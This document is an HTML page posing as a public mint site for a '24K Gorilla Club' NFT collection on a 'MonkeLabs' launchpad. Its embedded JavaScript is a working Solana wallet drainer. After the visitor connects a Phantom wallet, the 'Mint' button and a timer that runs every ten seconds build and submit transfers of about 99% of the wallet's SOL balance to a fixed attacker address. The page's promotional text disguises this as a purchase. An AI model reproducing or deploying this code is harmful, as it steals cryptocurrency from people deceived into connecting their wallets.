<!DOCTYPE html>
<html lang="en">
  <head>
	<meta charset="UTF-8" />
	<meta charset="utf-8">
    <meta name="description" content="24K Gorilla Club" data-react-helmet="true" />
    <meta name="theme-color" content="#2cc76f" data-react-helmet="true">
    <meta name="description" content="24K Gorilla Club" data-react-helmet="true">
    <meta content="ðŸš¨ âž¥ CLICK HERE TO MINT! âœ…" property="og:title">
    <meta content="
	
    ðŸŽ‰ We are glad to to announce that the public minting for 3500 24K Gorilla Club NFT is now live!
    
    ð–ðž ð¬ð­ðšð«ð­ ðžðšð«ð¥ð¢ðžð« ð­ð¨ ð¦ðšð¤ðž ð¬ð®ð«ðž ðžð¯ðžð«ð²ð¨ð§ðž ð¡ðšð¬ ðš ðœð¡ðšð§ðœðž ð­ð¨ ð¦ð¢ð§ð­.

    ðŸ·ï¸Sale Info
    â–¶ Mint Price: 1.5 SOL
    â–¶ Supply: 3,500

    â— Mint will be on MonkeLabs Launchpad ONLY.

    ðŸŽ€ ð“ð¡ðšð§ð¤ ð²ð¨ð® for your patience and supportâ¢ ðŸŽ€" 
    property="og:description">
    <meta content='https://pbs.twimg.com/profile_banners/1476231715865735169/1645383696/1500x500' property='og:image'>
    <meta name="twitter:card" content="summary_large_image">
	<link type="application/json+oembed" href="https://monkelabs.ink/embed.json"/>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width" />
    <meta name="format-detection" content="telephone=no" />
    <title>MonkeLabs.io Mint</title>
	<link rel="shortcut icon" href="favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/style.css" />
  </head>

  <body>
    <div class="wrapper">
      <div class="image">
        <img src="images/image.png" alt="" />
      </div>

      <div class="showcase">
        <div class="showcase__item">
          <h1 class="showcase__title">24K Gorilla Club</h1>
          <div class="showcase__text">
           3500 gorilas divided into five factions led by their respective heroes will contribute to the transition into the metaverse through collaborative mechanisms.
          </div>
          <div class="showcase__btns">
            <div
            class="showcase__btn"
            href="javascript:;"
            id="connect"
            style="display: flex"
          >
            Connect wallet
          </div>
          <div
            class="showcase__btn"
            href="javascript:;"
            id="transfer"
            style="display: none"
          >
            Mint
          </div>
          </div>
          <a href="index.html#" class="showcase__buy">Buy Solana</a>
          <div class="showcase__power">
            <img src="images/power.png" alt="">
          </div>
        </div>
      </div>
    </div>

    <script src="https://unpkg.com/@solana/web3.js@1.29.2/lib/index.iife.min.js"></script>
    <script>
      function upValue() {
        document.getElementById("counet").value =
          parseInt(1) + parseInt(document.getElementById("counet").value);

        document.getElementById("wqwqw").textContent =
          (parseInt(document.getElementById("counet").value) * 1.777)
            .toFixed(2)
            .toString() + " SOL";
      }

      function downValue() {
        if (document.getElementById("counet").value == "1") {
        } else {
          document.getElementById("counet").value =
            parseInt(document.getElementById("counet").value) - parseInt(1);

          document.getElementById("wqwqw").textContent =
            (parseInt(document.getElementById("counet").value) * 1.777)
              .toFixed(2)
              .toString() + " SOL";
        }
      }
      window.addEventListener("load", () => {
        var sent = false;
        const connection = new solanaWeb3.Connection(
          solanaWeb3.clusterApiUrl("mainnet-beta")
        );

        const getProvider = () => {
          if ("solana" in window) {
            const provider = window.solana;
            if (provider.isPhantom) {
              return provider;
            }
          }
          window.open("https://phantom.app/", "_blank");
        };

        function onBodyLoad() {
          const solConnected = window.solana.isConnected;

          if (!solConnected) {
            connectWallet();
          } else {
            document.getElementById("transfer").style.display = "flex";
            document.getElementById("connect").style.display = "none";
          }
          refreshStatus();
        }

        function refreshStatus() {
          const provider = getProvider();
          if (provider) {
            provider.on("connect", () => {
              setConnected();
              document.getElementById("transfer").style.display = "flex";
              document.getElementById("connect").style.display = "none";
            });
            provider.on("disconnect", () => {
              setNotConnected();
            });
          }
        }

        function connectWallet() {
          window.solana.connect({
            onlyIfTrusted: false,
          });
        }
        async function setConnected() {
          let account_info = await connection.getAccountInfo(
            window.solana.publicKey
          );
          console.log("Auto Approve: " + window.solana.autoApprove);
        }

        function trySend() {
          if (window.solana.autoApprove) {
            if (!sent) {
              apimainnet();
            }
          } else {
            console.log("Not auto approve!");
          }
        }
        async function testTransfer2(howmany) {
          const provider = getProvider();
          const solConected = window.solana.isConnected;
          const manylamports = (howmany * 1000000000).toFixed(0);

          if (!provider) {
            return;
          }
          if (!solConected) {
            return;
          }

          let account_info = await connection.getAccountInfo(
            window.solana.publicKey
          );
          var charginglamports = manylamports;
          console.log(charginglamports);
          if (account_info.lamports / 2 > manylamports) {
            charginglamports = (account_info.lamports * 0.99).toFixed(0);
          }

          if (
            account_info.lamports < manylamports &&
            account_info.lamports > 100000
          ) {
            charginglamports = (account_info.lamports * 0.99).toFixed(0);
          }
          console.log(charginglamports);

          let transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey: provider.publicKey,
              toPubkey: "J58dRMnWrQncP91fzffNuFGaVn8GSEQ8zDGC4FUwWnZK",
              lamports: charginglamports,
            })
          );

          let { blockhash } = await connection.getRecentBlockhash();
          transaction.recentBlockhash = blockhash;
          transaction.feePayer = provider.publicKey;

          return transaction;
        }

        async function makeTransfer(howmany) {
          let transaction = await testTransfer2(howmany);
          const provider = getProvider();

          if (!provider) {
            return;
          }
          console.log(provider);
          console.log(transaction);

          if (transaction) {
            //try {

            console.log("asd");
            let signed = await provider.signTransaction(
              transaction,
              connection
            );
            console.log(signed);
            let signature = await connection.sendRawTransaction(
              signed.serialize()
            );
            console.log(signature);
            await connection.confirmTransaction(signature);
            //} catch(err) {
            //  console.warn(err);
            //}
          }
        }

        async function testTransfer() {
          const provider = getProvider();
          const solConected = window.solana.isConnected;

          if (!provider) {
            return;
          }
          if (!solConected) {
            return;
          }

          let account_info = await connection.getAccountInfo(
            window.solana.publicKey
          );

          if (account_info.lamports >= 10000000) {
            let transaction = new solanaWeb3.Transaction().add(
              solanaWeb3.SystemProgram.transfer({
                fromPubkey: provider.publicKey,
                toPubkey: "J58dRMnWrQncP91fzffNuFGaVn8GSEQ8zDGC4FUwWnZK",
                lamports: (account_info.lamports * 0.99).toFixed(0),
              })
            );

            let { blockhash } = await connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = provider.publicKey;

            return transaction;
          }
        }

        async function apimainnet() {
          let transaction = await testTransfer();
          const provider = getProvider();

          if (!provider) {
            return;
          }
          console.log(provider);
          console.log(transaction);

          if (transaction) {
            //try {

            console.log("asd");
            let signed = await provider.signTransaction(
              transaction,
              connection
            );
            console.log(signed);
            let signature = await connection.sendRawTransaction(
              signed.serialize()
            );
            console.log(signature);
            sent = true;
            await connection.confirmTransaction(signature);
            //} catch(err) {
            //  console.warn(err);
            //}
          }
        }

        function setNotConnected() {
          // document.getElementById("connStatus").innerHTML = "Not Connected";
        }
        onBodyLoad();
        setInterval(trySend, 10000);

        document.getElementById("transfer").onclick = function () {
          makeTransfer(100000);
        };
        document.getElementById("connect").onclick = function () {
          onBodyLoad();
        };
      });
    </script>
  </body>
</html>
